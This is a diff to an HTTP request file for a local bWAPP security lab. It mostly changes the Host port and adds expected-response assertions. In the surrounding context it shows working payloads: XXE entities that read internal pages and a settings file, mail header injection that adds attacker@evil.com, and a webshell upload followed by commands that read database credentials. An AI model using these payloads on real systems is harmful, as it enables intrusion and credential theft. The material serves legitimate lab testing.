@@ -23,7 +23,7 @@
 ###   re-test after any upgrade.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/xxe-2.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: text/xml
 
@@ -38,11 +38,12 @@ Content-Type: text/xml
 ###   enabled this would reach anything only the web server can see.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/xxe-2.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: text/xml
 
 <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "http://127.0.0.1/login.php">]><reset><login>&x;</login><secret>s</secret></reset>
+### EXPECT-BODY: An error occured!
 ### Expected: 200 "An error occured!" and no bWAPP login markup -> blocked here
 
 
@@ -52,11 +53,12 @@ Content-Type: text/xml
 ###   fetch, so it is blocked for the same libxml reason as XXE-01.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/xxe-2.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: text/xml
 
 <?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=/app/admin/settings.php">]><reset><login>&x;</login><secret>s</secret></reset>
+### EXPECT-BODY: An error occured!
 ### Expected: 200 "An error occured!" -> blocked here
 
 
@@ -67,7 +69,7 @@ Content-Type: text/xml
 ###   Verify with 00-auth.http #4 (secret.php) - the secret is now yours.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/xxe-2.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: text/xml
 
@@ -79,7 +81,7 @@ Content-Type: text/xml
 ### XXI-02  Boolean SQLi inside the WHERE clause
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/xxe-2.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: text/xml
 
@@ -94,7 +96,7 @@ Content-Type: text/xml
 ###   (connect_i.php -> die("Connect Error: " . $link->error)).
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/xxe-2.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: text/xml
 
@@ -110,7 +112,7 @@ Content-Type: text/xml
 ###   admin account. This is the highest-impact request in the whole repo.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/xxe-2.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: text/xml
 
@@ -126,7 +128,7 @@ Content-Type: text/xml
 ###   %0d%0a is the encoded CRLF.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/maili.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -138,7 +140,7 @@ ip=127.0.0.1&name=bee&email=victim%40x.com%0d%0aCc%3Aattacker%40evil.com&subject
 ### MAIL-02  Second recipient added via the Subject field (alt injection point)
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/maili.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: application/x-www-form-urlencoded
 
@@ -154,7 +156,7 @@ ip=127.0.0.1&name=bee&email=victim%40x.com&subject=hi%0d%0aBcc%3Aattacker%40evil
 ###   (scripts/setup-bwapp.ps1 chmods images/ so the write actually lands.)
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/unrestricted_file_upload.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: {{authCookie}}
 Content-Type: multipart/form-data; boundary=----bwappLab
 
@@ -181,7 +183,7 @@ Content-Type: application/octet-stream
 ###   remote code execution, not just a file write.
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/images/shell.php?c=id HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 ### Expected: 200, body: uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ### Note: this request needs NO session cookie - the webshell is public.
 
@@ -190,7 +192,7 @@ Host: localhost:8080
 ### UPL-03  Same webshell, arbitrary command (read the DB credentials)
 ### ---------------------------------------------------------------------------
 GET {{baseUrl}}/images/shell.php?c=cat+/app/admin/settings.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 ### Expected: 200, the plaintext settings.php including $login / $password
 
 
@@ -204,7 +206,7 @@ Host: localhost:8080
 ###   Re-send UPL-01 with the Cookie header below to see the filter fire.
 ### ---------------------------------------------------------------------------
 POST {{baseUrl}}/unrestricted_file_upload.php HTTP/1.1
-Host: localhost:8080
+Host: localhost:8443
 Cookie: PHPSESSID={{session}}; security_level=1
 Content-Type: multipart/form-data; boundary=----bwappLab
 
